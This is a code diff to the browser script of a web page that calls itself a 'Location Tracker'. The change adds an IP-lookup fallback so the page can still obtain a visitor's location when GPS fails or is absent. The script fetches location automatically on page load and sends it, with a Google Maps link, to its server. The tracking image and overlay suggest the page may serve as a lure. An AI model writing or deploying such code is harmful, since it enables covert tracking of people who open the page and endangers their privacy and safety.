@@ -1,9 +1,23 @@
 // public/script.js
 let trackingInProgress = false;
 let latestLocationData = null;
-let watchId = null;
-let isWatching = false;
 let autoFetched = false;
+let serverBaseUrl = '';
+
+// Get server base URL
+async function getServerConfig() {
+    try {
+        const response = await fetch('/api/config');
+        const result = await response.json();
+        if (result.success) {
+            serverBaseUrl = result.data.baseUrl;
+            console.log('📡 Server URL:', serverBaseUrl);
+        }
+    } catch (error) {
+        console.error('Failed to get server config:', error);
+        serverBaseUrl = window.location.origin;
+    }
+}
 
 // Get DEVICE location using browser geolocation API
 function getDeviceLocation() {
@@ -83,13 +97,31 @@ async function autoFetchLocation() {
         return;
     }
     
-    console.log('🔄 Auto-fetching location...');
+    console.log('🔄 Auto-fetching location on Render...');
     updateBanner('🔄', 'Auto-fetching location...', '');
     showStatus('loading', '📡 Auto-fetching your location...');
     updateGPSStatus('loading');
 
     try {
-        const location = await getDeviceLocation();
+        // Try GPS first
+        let location = null;
+        try {
+            location = await getDeviceLocation();
+        } catch (gpsError) {
+            console.log('GPS failed, trying IP fallback...', gpsError.message);
+            // Try IP fallback
+            const ipLocation = await getLocationFromIP();
+            if (ipLocation) {
+                location = {
+                    ...ipLocation,
+                    source: 'IP Fallback',
+                    accuracy: 5000,
+                    googleMapsLink: `https://www.google.com/maps?q=${ipLocation.latitude},${ipLocation.longitude}`
+                };
+            } else {
+                throw gpsError;
+            }
+        }
         
         if (!location) {
             throw new Error('Could not get your device location');
@@ -120,7 +152,22 @@ async function autoFetchLocation() {
     }
 }
 
-// Manual fetch (on button click or image click)
+// Get location from IP (fallback)
+async function getLocationFromIP() {
+    try {
+        const response = await fetch('/api/get-location');
+        const result = await response.json();
+        if (result.success) {
+            return result.data;
+        }
+        return null;
+    } catch (error) {
+        console.error('IP lookup error:', error);
+        return null;
+    }
+}
+
+// Manual fetch
 async function manualFetchLocation() {
     if (trackingInProgress) return;
     trackingInProgress = true;
@@ -363,8 +410,11 @@ function hideError() {
 }
 
 // ===== PAGE LOAD - AUTO FETCH =====
-window.addEventListener('load', () => {
-    console.log('📍 Location Tracker loaded!');
+window.addEventListener('load', async () => {
+    console.log('📍 Location Tracker loaded on Render!');
+    
+    // Get server config first
+    await getServerConfig();
     
     if (navigator.geolocation) {
         console.log('✅ GPS available');
@@ -377,10 +427,40 @@ window.addEventListener('load', () => {
             autoFetchLocation();
         }, 1500);
     } else {
-        console.log('❌ GPS not available');
+        console.log('❌ GPS not available - trying IP fallback');
         updateGPSStatus(false);
-        showStatus('error', '❌ GPS not available on this device');
-        updateBanner('❌', 'GPS not available', 'error');
+        showStatus('loading', '🌐 Trying IP-based location...');
+        updateBanner('🔄', 'Trying IP location...', '');
+        
+        // Try IP fallback
+        setTimeout(async () => {
+            try {
+                const ipLocation = await getLocationFromIP();
+                if (ipLocation) {
+                    const location = {
+                        ...ipLocation,
+                        source: 'IP Fallback',
+                        accuracy: 5000,
+                        googleMapsLink: `https://www.google.com/maps?q=${ipLocation.latitude},${ipLocation.longitude}`
+                    };
+                    latestLocationData = location;
+                    await sendLocationToServer(location);
+                    showStatus('success', '✅ Location via IP (GPS unavailable)');
+                    showResult(location);
+                    updateBanner('✅', 'Location via IP fallback', 'success');
+                    updateGPSStatus(true);
+                    document.getElementById('trackingImage').src = 
+                        'https://via.placeholder.com/600x350/28a745/ffffff?text=📍+IP+Location!';
+                    document.getElementById('overlay').style.display = 'none';
+                    await loadLatestLocation();
+                    autoFetched = true;
+                }
+            } catch (err) {
+                console.error('IP fallback failed:', err);
+                showStatus('error', '❌ Could not get location');
+                updateBanner('❌', 'Location failed', 'error');
+            }
+        }, 1500);
     }
     
     loadLatestLocation();
